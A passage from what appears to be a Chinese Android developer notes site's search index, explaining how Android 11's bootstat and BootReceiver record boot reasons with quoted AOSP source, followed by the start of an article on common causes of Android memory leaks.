<code>ro.boot.bootreason</code>\uff1a\u7cfb\u7edf\u542f\u52a8\u8fc7\u7a0b\u4e2d\uff0cInit\u8fdb\u7a0b\u4f1a\u5c06\u5185\u6838\u542f\u52a8\u547d\u4ee4\u884c\u4e2d\u7684<code>androidboot.bootreason=&lt;reason&gt;</code>\u8f6c\u5316\u4e3a<code>ro.boot.bootreason</code>\u3002\u542f\u52a8\u547d\u4ee4\u884c\u4e2d\u7684<code>bootreason</code>\u7531\u4e00\u822c\u82af\u7247\u4f9b\u5e94\u5546\u63d0\u4f9b\uff0c\u5185\u6838\u5728\u65ad\u7535\u524d\u4f1a\u5c06\u542f\u52a8\u539f\u56e0\u5199\u5165\u4e13\u7528\u7684\u786c\u4ef6\u8d44\u6e90\u6216\u7ea6\u5b9a\u7684\u5185\u5b58\u5730\u5740\u3002\u4e0b\u6b21\u542f\u52a8\u65f6\uff0cBootloader\u5c31\u53ef\u4ee5\u8bfb\u53d6\u76f8\u5e94\u7684\u8d44\u6e90\u6765\u786e\u5b9a\u542f\u52a8\u539f\u56e0\uff0c\u7136\u540e\u6dfb\u52a0\u5230\u5185\u6838\u542f\u52a8\u547d\u4ee4\u884c\u4e2d\u3002\u5982\u679c\u82af\u7247\u4f9b\u5e94\u5546\u4e0d\u652f\u6301\u542f\u52a8\u539f\u56e0\u5199\u5165\uff0c<code>androidboot.bootreason</code>\u5c31\u53ef\u80fd\u4e0d\u5b58\u5728\u3002 - <code>sys.boot.reason</code>\uff1a\u7cfb\u7edf\u542f\u52a8\u65f6\u5148\u5c06<code>ro.boot.bootreason</code>\u590d\u5236\u7ed9<code>sys.boot.reason</code>\u3002\u56e0\u4e3a<code>ro.boot.bootreason</code>\u53ef\u80fd\u4e0d\u5b58\u5728\uff0c\u6216\u8005\u53ef\u80fd\u63d0\u4f9b\u4e0d\u51c6\u786e\u3001\u4e0d\u53ef\u89e3\u6790\u6216\u4e0d\u5408\u89c4\u8303\u7684\u4fe1\u606f\uff0c\u5728\u542f\u52a8\u5b8c\u6210\u540e\u4f1a\u8fdb\u4e00\u6b65\u66f4\u65b0<code>sys.boot.reason</code>\u3002\u66f4\u65b0\u540e\u7684<code>sys.boot.reason</code>\u5c06\u63d0\u4f9b\u51c6\u786e\u53ef\u9760\u7684\u3001\u7b26\u5408\u89c4\u8303\u7684\u542f\u52a8\u539f\u56e0\u3002 - <code>persist.sys.boot.reason</code>\uff1aAndroid\u7cfb\u7edf\u5728\u91cd\u542f\u524d\u4f1a\u5c06\u91cd\u542f\u539f\u56e0\u5199\u5165\u5230<code>persist.sys.boot.reason</code>\u4e2d\u3002\u8fd9\u4e2a\u5c5e\u6027\u53ef\u4ee5\u7528\u6765\u5728<code>ro.boot.bootreason</code>\u4e0d\u5b58\u5728\u65f6\uff0c\u534f\u52a9\u786e\u5b9a\u542f\u52a8\u539f\u56e0\u3002</p> <p>Bootstat\u5bf9sys.boot.reason\u5904\u7406\u7684\u7b80\u5355\u6d41\u7a0b\u5982\u4e0b\uff0c - \u8bfb\u53d6ro.boot.bootreason\uff0c\u5c06\u5176\u8f6c\u5316\u4e3a\u7b26\u5408\u89c4\u8303\u7684reason\u3002 - \u5982\u679creason\u662fwatchdog\uff0c\u68c0\u67e5\u662f\u5426\u9700\u8981\u589e\u52a0security\u6807\u7b7e\u3002 - \u5982\u679creason\u662fkernel_panic\uff0c\u4ecelast klog\u4e2d\u67e5\u627e\u8be6\u7ec6\u4fe1\u606f\u3002 - \u5982\u679creason\u5c5e\u4e8e\u5f31\u96c6\uff08\u5305\u542b\u7a7a\u503c\uff09\uff0c\u4ecelast klog\u4e2d\u67e5\u627e\u4fe1\u606f\uff0c\u68c0\u67e5\u662f\u5426\u7535\u6c60\u8017\u5c3d\u5f15\u8d77\u6b7b\u673a\uff0c\u6839\u636epersist.sys.boot.reason\u4fee\u6b63reason\u3002 - \u5982\u679c\u4e0a\u8ff0\u64cd\u4f5c\u4f9d\u7136\u65e0\u6cd5\u786e\u5b9areason\uff0c\u5c06\u503c\u8bbe\u7f6e\u4e3areboot,\u3002 - \u5982\u679creason\u5c5e\u4e8e\u5185\u6838\u96c6\uff0c\u91cd\u5199persist.sys.boot.reason\u3002 <p>http://www.aospxref.com/android-11.0.0_r21/xref/system/core/bootstat/bootstat.rc</p> <pre><code>3 # Mirror bootloader boot reason to system boot reason\n4 # ro.boot.bootreason should be set by init already\n5 # before post-fs trigger\n6 on post-fs &amp;&amp; property:ro.boot.bootreason=*\n7     setprop sys.boot.reason ${ro.boot.bootreason}\n\n70 # Set boot reason\n71 on property:ro.persistent_properties.ready=true\n72     # Converts bootloader boot reason and persist.sys.boot.reason to system boot reason\n73     # Need go after persist peroperties are loaded which is right before zygote-start trigger\n74     exec_background - system log -- /system/bin/bootstat --set_system_boot_reason\n\n76 # Record boot complete metrics.\n77 on property:sys.boot_completed=1 &amp;&amp; property:sys.bootstat.first_boot_completed=0\n78     # Record boot_complete and related stats (decryption, etc).\n79     # Record the boot reason.\n80     # Record time since factory reset.\n81     # Log all boot events.\n82     exec_background - system log -- /system/bin/bootstat --record_boot_complete --record_boot_reason --record_time_since_factory_reset -l\n83     setprop sys.bootstat.first_boot_completed 1\n</code></pre> <p>http://www.aospxref.com/android-11.0.0_r21/xref/system/core/bootstat/bootstat.cpp</p> <pre><code>1059      // Is there a controlled shutdown hint in last_reboot_reason_property?\n1060      if (isBluntRebootReason(ret)) {\n1061        // Content buffer no longer will have console data. Beware if more\n1062        // checks added below, that depend on parsing console content.\n1063        if (!android::base::ReadFileToString(last_reboot_reason_file, &amp;content)) {\n1064          content = android::base::GetProperty(last_reboot_reason_property, \"\");\n1065        }\n1066        transformReason(content);\n\n1232  void SetSystemBootReason() {\n1233    const auto bootloader_boot_reason =\n1234        android::base::GetProperty(bootloader_reboot_reason_property, \"\");\n1235    const std::string system_boot_reason(BootReasonStrToReason(bootloader_boot_reason));\n1236    // Record the scrubbed system_boot_reason to the property\n1237    BootReasonAddToHistory(system_boot_reason);\n1238    // Shift last_reboot_reason_property to last_last_reboot_reason_property\n1239    std::string last_boot_reason;\n1240    if (!android::base::ReadFileToString(last_reboot_reason_file, &amp;last_boot_reason)) {\n1241      PLOG(ERROR) &lt;&lt; \"Failed to read \" &lt;&lt; last_reboot_reason_file;\n1242      last_boot_reason = android::base::GetProperty(last_reboot_reason_property, \"\");\n1243      LOG(INFO) &lt;&lt; \"Value of \" &lt;&lt; last_reboot_reason_property &lt;&lt; \" : \" &lt;&lt; last_boot_reason;\n1244    } else {\n1245      LOG(INFO) &lt;&lt; \"Last reboot reason read from \" &lt;&lt; last_reboot_reason_file &lt;&lt; \" : \"\n1246                &lt;&lt; last_boot_reason &lt;&lt; \". Last reboot reason read from \"\n1247                &lt;&lt; last_reboot_reason_property &lt;&lt; \" : \"\n1248                &lt;&lt; android::base::GetProperty(last_reboot_reason_property, \"\");\n1249    }\n1250    if (last_boot_reason.empty() || isKernelRebootReason(system_boot_reason)) {\n1251      last_boot_reason = system_boot_reason;\n1252    } else {\n1253      transformReason(last_boot_reason);\n1254    }\n1255    LOG(INFO) &lt;&lt; \"Normalized last reboot reason : \" &lt;&lt; last_boot_reason;\n1256    android::base::SetProperty(last_last_reboot_reason_property, last_boot_reason);\n1257    android::base::SetProperty(last_reboot_reason_property, \"\");\n1258    if (unlink(last_reboot_reason_file) != 0) {\n1259      PLOG(ERROR) &lt;&lt; \"Failed to unlink \" &lt;&lt; last_reboot_reason_file;\n1260    }\n1261  }\n</code></pre>"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#8","title":"8 \u5b8c\u6210\u542f\u52a8","text":"<p>http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/core/res/AndroidManifest.xml</p> <pre><code>5271 \n5272         &lt;receiver android:name=\"com.android.server.BootReceiver\"\n5273                 android:systemUserOnly=\"true\"&gt;\n5274             &lt;intent-filter android:priority=\"1000\"&gt;\n5275                 &lt;action android:name=\"android.intent.action.BOOT_COMPLETED\" /&gt;\n5276             &lt;/intent-filter&gt;\n5277         &lt;/receiver&gt;\n</code></pre> <p>http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/core/java/com/android/server/BootReceiver.java</p> <pre><code>65  public class BootReceiver extends BroadcastReceiver {\n\n124      @Override\n125      public void onReceive(final Context context, Intent intent) {\n126          // Log boot events in the background to avoid blocking the main thread with I/O\n127          new Thread() {\n128              @Override\n129              public void run() {\n130                  try {\n131                      logBootEvents(context);\n\n\n198      private void logBootEvents(Context ctx) throws IOException {\n199          final DropBoxManager db = (DropBoxManager) ctx.getSystemService(Context.DROPBOX_SERVICE);\n200          final String headers = getBootHeadersToLogAndUpdate();\n201          final String bootReason = SystemProperties.get(\"ro.boot.bootreason\", null);\n202  \n203          String recovery = RecoverySystem.handleAftermath(ctx);\n204          if (recovery != null &amp;&amp; db != null) {\n205              db.addText(\"SYSTEM_RECOVERY_LOG\", headers + recovery);\n206          }\n207  \n208          String lastKmsgFooter = \"\";\n209          if (bootReason != null) {\n210              lastKmsgFooter = new StringBuilder(512)\n211                  .append(\"\\n\")\n212                  .append(\"Boot info:\\n\")\n213                  .append(\"Last boot reason: \").append(bootReason).append(\"\\n\")\n214                  .toString();\n215          }\n216  \n217          HashMap&lt;String, Long&gt; timestamps = readTimestamps();\n218  \n219          if (SystemProperties.getLong(\"ro.runtime.firstboot\", 0) == 0) {\n220              if (StorageManager.inCryptKeeperBounce()) {\n221                  // Encrypted, first boot to get PIN/pattern/password so data is tmpfs\n222                  // Don't set ro.runtime.firstboot so that we will do this again\n223                  // when data is properly mounted\n224              } else {\n225                  String now = Long.toString(System.currentTimeMillis());\n226                  SystemProperties.set(\"ro.runtime.firstboot\", now);\n227              }\n228              if (db != null) db.addText(\"SYSTEM_BOOT\", headers);\n229  \n230              // Negative sizes mean to take the *tail* of the file (see FileUtils.readTextFile())\n231              addLastkToDropBox(db, timestamps, headers, lastKmsgFooter,\n232                      \"/proc/last_kmsg\", -LASTK_LOG_SIZE, \"SYSTEM_LAST_KMSG\");\n233              addLastkToDropBox(db, timestamps, headers, lastKmsgFooter,\n234                      \"/sys/fs/pstore/console-ramoops\", -LASTK_LOG_SIZE, \"SYSTEM_LAST_KMSG\");\n235              addLastkToDropBox(db, timestamps, headers, lastKmsgFooter,\n236                      \"/sys/fs/pstore/console-ramoops-0\", -LASTK_LOG_SIZE, \"SYSTEM_LAST_KMSG\");\n237              addFileToDropBox(db, timestamps, headers, \"/cache/recovery/log\", -LOG_SIZE,\n238                      \"SYSTEM_RECOVERY_LOG\");\n239              addFileToDropBox(db, timestamps, headers, \"/cache/recovery/last_kmsg\",\n240                      -LOG_SIZE, \"SYSTEM_RECOVERY_KMSG\");\n241              addAuditErrorsToDropBox(db, timestamps, headers, -LOG_SIZE, \"SYSTEM_AUDIT\");\n242          } else {\n243              if (db != null) db.addText(\"SYSTEM_RESTART\", headers);\n244          }\n245          // log always available fs_stat last so that logcat collecting tools can wait until\n246          // fs_stat to get all file system metrics.\n247          logFsShutdownTime();\n248          logFsMountTime();\n249          addFsckErrorsToDropBoxAndLogFsStat(db, timestamps, headers, -LOG_SIZE, \"SYSTEM_FSCK\");\n250          logSystemServerShutdownTimeMetrics();\n251  \n252          // Scan existing tombstones (in case any new ones appeared)\n253          File[] tombstoneFiles = TOMBSTONE_DIR.listFiles();\n254          for (int i = 0; tombstoneFiles != null &amp;&amp; i &lt; tombstoneFiles.length; i++) {\n255              if (tombstoneFiles[i].isFile()) {\n256                  addFileToDropBox(db, timestamps, headers, tombstoneFiles[i].getPath(),\n257                          LOG_SIZE, \"SYSTEM_TOMBSTONE\");\n258              }\n259          }\n260  \n261          writeTimestamps(timestamps);\n262  \n263          // Start watching for new tombstone files; will record them as they occur.\n264          // This gets registered with the singleton file observer thread.\n265          sTombstoneObserver = new FileObserver(TOMBSTONE_DIR.getPath(), FileObserver.CREATE) {\n266              @Override\n267              public void onEvent(int event, String path) {\n268                  HashMap&lt;String, Long&gt; timestamps = readTimestamps();\n269                  try {\n270                      File file = new File(TOMBSTONE_DIR, path);\n271                      if (file.isFile() &amp;&amp; file.getName().startsWith(\"tombstone_\")) {\n272                          addFileToDropBox(db, timestamps, headers, file.getPath(), LOG_SIZE,\n273                                  TAG_TOMBSTONE);\n274                      }\n275                  } catch (IOException e) {\n276                      Slog.e(TAG, \"Can't log tombstone\", e);\n277                  }\n278                  writeTimestamps(timestamps);\n279              }\n280          };\n281  \n282          sTombstoneObserver.startWatching();\n283      }\n</code></pre>"},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/","title":"Android\u5185\u5b58\u6cc4\u9732\u4f18\u5316\u603b\u7ed3","text":"<p>android\u624b\u673a\u7ed9\u5e94\u7528\u5206\u914d\u7684\u5185\u5b58\u901a\u5e38\u662f8\u5146\u5de6\u53f3\uff0c\u5982\u679c\u5904\u7406\u5185\u5b58\u5904\u7406\u4e0d\u5f53\u5f88\u5bb9\u6613\u9020\u6210OutOfMemoryError\uff0c\u6211\u4eec\u7684\u4ea7\u54c1\u51fa\u73b0\u6700\u591a\u7684\u9519\u8bef\u4e5f\u662fOutOfMemoryError\u7684\u5f02\u5e38\uff0c \u5728\u89e3\u51b3\u8fd9\u4e2a\u5f02\u5e38\u65f6\u5728\u7f51\u4e0a\u53d1\u73b0\u5f88\u591a\u5173\u4e8eOutOfMemoryError\u7684\u539f\u56e0\u7684\u4ecb\u7ecd\u3002 OutOfMemoryError\u4e3b\u8981\u7531\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5\u9020\u6210\uff1a  </p>"},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#1cursor","title":"1.\u6570\u636e\u5e93\u7684cursor\u6ca1\u6709\u5173\u95ed\u3002","text":"<p>\u64cd\u4f5cSqlite\u6570\u636e\u5e93\u65f6\uff0cCursor\u662f\u6570\u636e\u5e93\u8868\u4e2d\u6bcf\u4e00\u884c\u7684\u96c6\u5408\uff0cCursor\u63d0\u4f9b\u4e86\u5f88\u591a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u8bfb\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u503c\uff0c \u00a0\u00a0\u00a0 \u53ef\u4ee5\u6839\u636e\u7d22\u5f15\uff0c\u5217\u540d\u7b49\u83b7\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u503c\uff0c\u901a\u8fc7\u6e38\u6807\u7684\u65b9\u5f0f\u53ef\u4ee5\u8c03\u7528moveToNext()\u79fb\u5230\u4e0b\u4e00\u884c \u00a0\u00a0\u00a0 \u5f53\u6211\u4eec\u64cd\u4f5c\u5b8c\u6570\u636e\u5e93\u540e\uff0c\u4e00\u5b9a\u8981\u8bb0\u5f97\u8c03\u7528Cursor\u5bf9\u8c61\u7684close()\u6765\u5173\u95ed\u6e38\u6807\uff0c\u91ca\u653e\u8d44\u6e90\u3002  </p>"},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#2adaptercontentview","title":"2.\u6784\u9020adapter\u6ca1\u6709\u4f7f\u7528\u7f13\u5b58contentview\u3002","text":"<p>\u5728\u7ee7\u627fBaseAdapter\u65f6\u4f1a\u8ba9\u6211\u4eec\u91cd\u5199getView(int position, View\u00a0\u00a0 convertView, ViewGroup parent)\u65b9\u6cd5\uff0c \u00a0\u00a0\u00a0 \u7b2c\u4e8c\u4e2a\u53c2\u6570convertView\u5c31\u662f\u6211\u4eec\u8981\u7528\u5230\u7684\u91cd\u7528\u7684\u5bf9\u8c61</p> <p>Java\u4ee3\u7801 \u00a0</p> <pre><code>1.  @Override\u00a0\u00a0\n2.  public\u00a0View\u00a0getView(int\u00a0position,\u00a0View\u00a0convertView,\u00a0ViewGroup\u00a0parent)\u00a0{\u00a0\u00a0\n3.  \u00a0\u00a0\u00a0\u00a0ViewHolder\u00a0vHolder\u00a0=\u00a0null;\u00a0\u00a0\n\n5.  \u00a0\u00a0\u00a0\u00a0if\u00a0(convertView\u00a0==\u00a0null)\u00a0{\u00a0\u00a0\n6.  \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0convertView\u00a0=\u00a0inflater.inflate(...,\u00a0null);\u00a0\u00a0\n\n8.  \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0vHolder\u00a0=\u00a0new\u00a0ViewHolder();\u00a0\u00a0\n9.  \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0vHolder.img=\u00a0(ImageView)\u00a0convertView.findViewById(...);\u00a0\u00a0\n10.  \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0vHolder.tv=\u00a0(TextView)\u00a0convertView\u00a0\u00a0\n11.  \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0.findViewById(...);\u00a0\u00a0\n\n13.  \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0convertView.setTag(vHolder);\u00a0\u00a0\n14.  \u00a0\u00a0\u00a0\u00a0}\u00a0else\u00a0{\u00a0\u00a0\n\n16.  \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0vHolder\u00a0=\u00a0(ViewHolder)\u00a0convertView.getTag();\u00a0\u00a0\n17.  \u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\n\n19.  \u00a0\u00a0\u00a0\u00a0vHolder.img.setImageBitmap(...);\u00a0\u00a0\n20.  \u00a0\u00a0\u00a0\u00a0vHolder.tv.setText(...);\u00a0\u00a0\n21.  \u00a0\u00a0\u00a0\u00a0return\u00a0convertView;\u00a0\u00a0\n22.  }\u00a0\u00a0\n\n24.  static\u00a0class\u00a0ViewHolder\u00a0{\u00a0\u00a0\n25.  \u00a0\u00a0\u00a0\u00a0TextView\u00a0tv;\u00a0\u00a0\n26.  \u00a0\u00a0\u00a0\u00a0ImageView\u00a0img;\u00a0\u00a0\n27.  }\u00a0\u00a0\n</code></pre> <p>\u8fd9\u91cc\u53ea\u8bb2\u4f7f\u7528\u65b9\u6cd5\uff0c\u5177\u4f53\u6027\u80fd\u6d4b\u8bd5\u6587\u7ae0\u8bf7\u89c1\uff1a \u00a0\u00a0\u00a0 ListView\u4e2dgetView\u7684\u539f\u7406\uff0b\u5982\u4f55\u5728ListView\u4e2d\u653e\u7f6e\u591a\u4e2aitem \u00a0\u00a0\u00a0 http://www.cnblogs.com/xiaowenji/archive/2010/12/08/1900579.html \u00a0\u00a0\u00a0 Android\u5f00\u53d1\u4e4bListView\u9002\u914d\u5668\uff08Adapter\uff09\u4f18\u5316 \u00a0\u00a0\u00a0 http://shinfocom.iteye.com/blog/1231511  </p>"},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#3registerreceiverunregisterreceiver","title":"3.\u8c03\u7528registerReceiver()\u540e\u672a\u8c03\u7528unregisterReceiver().","text":"<p>\u5e7f\u64ad\u63a5\u6536\u8005\uff08BroadcastReceiver\uff09\u7ecf\u5e38\u5728\u5e94\u7528\u4e2d\u7528\u5230\uff0c\u53ef\u4ee5\u5728\u591a\u7ebf\u7a0b\u4efb\u52a1\u5b8c\u6210\u540e\u53d1\u9001\u5e7f\u64ad\u901a\u77e5UI\u66f4\u65b0\uff0c\u4e5f\u53ef\u4ee5\u63a5\u6536\u7cfb\u7edf\u5e7f\u64ad\u5b9e\u73b0\u4e00\u4e9b\u529f\u80fd \u00a0\u00a0\u00a0\u00a0 \u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u7684\u65b9\u5f0f\u6ce8\u518c\uff1a  </p> <pre><code>\u00a0\u00a0\u00a0 IntentFilter postFilter = new IntentFilter();  \n\u00a0\u00a0\u00a0 postFilter.addAction(getPackageName() + \".background.job\");  \n\u00a0\u00a0\u00a0 this.registerReceiver(receiver, postFilter);  \n</code></pre> <p>\u5f53\u6211\u4eecActivity\u4e2d\u4f7f\u7528\u4e86registerReceiver()\u65b9\u6cd5\u6ce8\u518c\u4e86BroadcastReceiver\uff0c\u4e00\u5b9a\u8981\u5728Activity\u7684\u751f\u547d\u5468\u671f\u5185\u8c03\u7528unregisterReceiver()\u65b9\u6cd5\u53d6\u6d88\u6ce8\u518c \u00a0\u00a0\u00a0 \u4e5f\u5c31\u662f\u8bf4registerReceiver()\u548cunregisterReceiver()\u65b9\u6cd5\u4e00\u5b9a\u8981\u6210\u5bf9\u51fa\u73b0\uff0c\u901a\u5e38\u6211\u4eec\u53ef\u4ee5\u91cd\u5199Activity\u7684onDestory()\u65b9\u6cd5\uff1a</p> <p>Java\u4ee3\u7801 \u00a0</p> <pre><code>1.  @Override\u00a0\u00a0\n2.  protected\u00a0void\u00a0onDestroy()\u00a0{\u00a0\u00a0\n3.  \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0this.unregisterReceiver(receiver);\u00a0\u00a0\n4.  \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0super.onDestroy();\u00a0\u00a0\n5.  }\u00a0\u00a0\n</code></pre>"},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#4inputstreamoutputstream","title":"4.\u672a\u5173\u95edInputStream/OutputStream\u3002","text":"<p>\u8fd9\u4e2a\u5c31\u4e0d\u591a\u8bf4\u4e86\uff0c\u6211\u4eec\u64cd\u4f5c\u5b8c\u8f93\u5165\u8f93\u51fa\u6d41\u90fd\u8981\u5173\u95ed\u6d41  </p>"},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#5bitmaprecycle","title":"5.Bitmap\u4f7f\u7528\u540e\u672a\u8c03\u7528recycle()\u3002","text":"<p>\u56fe\u7247\u5904\u7406\u4e0d\u597d\u662f\u9020\u6210\u5185\u5b58\u6ea2\u51fa\u7684\u53c8\u4e00\u4e2a\u5934\u53f7\u539f\u56e0\uff0c\uff08\u5728\u6211\u4eec\u7684\u4ea7\u54c1\u4e2d\u4e5f\u6709\u4f53\u73b0)\uff0c</p> <p>\u5f53\u6211\u4eec\u5904\u7406\u5b8c\u56fe\u7247\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528recycle()\u65b9\u6cd5\u6765\u56de\u6536\u56fe\u7247\u5bf9\u8c61</p> <p>Java\u4ee3\u7801 \u00a0</p> <pre><code>1.  if(!bitmap.isRecycled())\u00a0\u00a0\n2.  {\u00a0\u00a0\n3.  \u00a0\u00a0\u00a0\u00a0bitmap.recycle()\u00a0\u00a0\n4.  }\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n</code></pre> <p>\u9664\u6b64\u4e4b\u5916\uff1a \u00a0\u00a0\u00a0 \u76f4\u63a5\u4f7f\u7528ImageView\u663e\u793abitmap\u4f1a\u5360\u7528\u8f83\u591a\u8d44\u6e90\uff0c\u7279\u522b\u662f\u56fe\u7247\u8f83\u5927\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u5bfc\u81f4\u5d29\u6e83\u3002 \u00a0\u00a0\u00a0 \u4f7f\u7528BitmapFactory.Options\u8bbe\u7f6einSampleSize, \u8fd9\u6837\u505a\u53ef\u4ee5\u51cf\u5c11\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u8981\u6c42\u3002 \u00a0\u00a0\u00a0 \u5c5e\u6027\u503cinSampleSize\u8868\u793a\u7f29\u7565\u56fe\u5927\u5c0f\u4e3a\u539f\u59cb\u56fe\u7247\u5927\u5c0f\u7684\u51e0\u5206\u4e4b\u4e00\uff0c\u5373\u5982\u679c\u8fd9\u4e2a\u503c\u4e3a2\uff0c\u5219\u53d6\u51fa\u7684\u7f29\u7565\u56fe\u7684\u5bbd\u548c\u9ad8\u90fd\u662f\u539f\u59cb\u56fe\u7247\u76841/2\uff0c\u56fe\u7247\u5927\u5c0f\u5c31\u4e3a\u539f\u59cb\u5927\u5c0f\u76841/4\u3002  </p> <pre><code>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 BitmapFactory.Options bitmapFactoryOptions = new BitmapFactory.Options();\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 bitmapFactoryOptions.inJustDecodeBounds = true;\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 bitmapFactoryOptions.inSampleSize = 2;\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 // \u8fd9\u91cc\u4e00\u5b9a\u8981\u5c06\u5176\u8bbe\u7f6e\u56defalse\uff0c\u56e0\u4e3a\u4e4b\u524d\u6211\u4eec\u5c06\u5176\u8bbe\u7f6e\u6210\u4e86true\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 // \n</code></pre> <p>\u8bbe\u7f6einJustDecodeBounds\u4e3atrue\u540e\uff0cdecodeFile\u5e76\u4e0d\u5206\u914d\u7a7a\u95f4\uff0c\u5373\uff0cBitmapFactory\u89e3\u7801\u51fa\u6765\u7684Bitmap\u4e3aNull,\u4f46\u53ef\u8ba1\u7b97\u51fa\u539f\u59cb\u56fe\u7247\u7684\u957f\u5ea6\u548c\u5bbd\u5ea6\u00a0  </p> <pre><code>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 options.inJustDecodeBounds = false;  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Bitmap bmp = BitmapFactory.decodeFile(sourceBitmap, options);\u00a0  \n</code></pre>"},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#6context","title":"6.Context\u6cc4\u6f0f\u3002","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u5f88\u9690\u6666\u7684OutOfMemoryError\u7684\u60c5\u51b5\u3002\u5148\u770b\u4e00\u4e2aAndroid\u5b98\u7f51\u63d0\u4f9b\u7684\u4f8b\u5b50\uff1a</p> <p>Java\u4ee3\u7801 \u00a0</p> <pre><code>1.  private\u00a0static\u00a0Drawable\u00a0sBackground;\u00a0\u00a0\n2.  @Override\u00a0\u00a0\n3.  protected\u00a0void\u00a0onCreate(Bundle\u00a0state)\u00a0{\u00a0\u00a0\n4.  \u00a0\u00a0super.onCreate(state);\u00a0\u00a0\n\n6.  \u00a0\u00a0TextView\u00a0label\u00a0=\u00a0new\u00a0TextView(this);\u00a0\u00a0\n7.  \u00a0\u00a0label.setText(\"Leaks\u00a0are\u00a0bad\");\u00a0\u00a0\n\n9.  \u00a0\u00a0if\u00a0(sBackground\u00a0==\u00a0null)\u00a0{\u00a0\u00a0\n10.  \u00a0\u00a0\u00a0\u00a0sBackground\u00a0=\u00a0getDrawable(R.drawable.large\\_bitmap);\u00a0\u00a0\n11.  \u00a0\u00a0}\u00a0\u00a0\n12.  \u00a0\u00a0label.setBackgroundDrawable(sBackground);\u00a0\u00a0\n\n14.  \u00a0\u00a0setContentView(label);\u00a0\u00a0\n15.  }\u00a0\u00a0\n</code></pre> <p>\u8fd9\u6bb5\u4ee3\u7801\u6548\u7387\u5f88\u5feb\uff0c\u4f46\u540c\u65f6\u53c8\u662f\u6781\u5176\u9519\u8bef\u7684\uff1b \u00a0\u00a0\u00a0 \u5728\u7b2c\u4e00\u6b21\u5c4f\u5e55\u65b9\u5411\u5207\u6362\u65f6\u5b83\u6cc4\u9732\u4e86\u4e00\u5f00\u59cb\u521b\u5efa\u7684Activity\u3002\u5f53\u4e00\u4e2aDrawable\u9644\u52a0\u5230\u4e00\u4e2a View\u4e0a\u65f6\uff0c \u00a0\u00a0\u00a0 View\u4f1a\u5c06\u5176\u4f5c\u4e3a\u4e00\u4e2acallback\u8bbe\u5b9a\u5230Drawable\u4e0a\u3002\u4e0a\u8ff0\u7684\u4ee3\u7801\u7247\u6bb5\uff0c\u610f\u5473\u7740Drawable\u62e5\u6709\u4e00\u4e2aTextView\u7684\u5f15\u7528\uff0c \u00a0\u00a0\u00a0 \u800cTextView\u53c8\u62e5\u6709Activity\uff08Context\u7c7b\u578b\uff09\u7684\u5f15\u7528\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0cDrawable\u62e5\u6709\u4e86\u66f4\u591a\u7684\u5bf9\u8c61\u5f15\u7528\u3002\u5373\u4f7fActivity\u88ab \u9500\u6bc1\uff0c\u5185\u5b58\u4ecd\u7136\u4e0d\u4f1a\u88ab\u91ca\u653e\u3002 \u00a0\u00a0\u00a0 \u53e6\u5916\uff0c\u5bf9Context\u7684\u5f15\u7528\u8d85\u8fc7\u5b83\u672c\u8eab\u7684\u751f\u547d\u5468\u671f\uff0c\u4e5f\u4f1a\u5bfc\u81f4Context\u6cc4\u6f0f\u3002\u6240\u4ee5\u5c3d\u91cf\u4f7f\u7528Application\u8fd9\u79cdContext\u7c7b\u578b\u3002 \u00a0\u00a0\u00a0 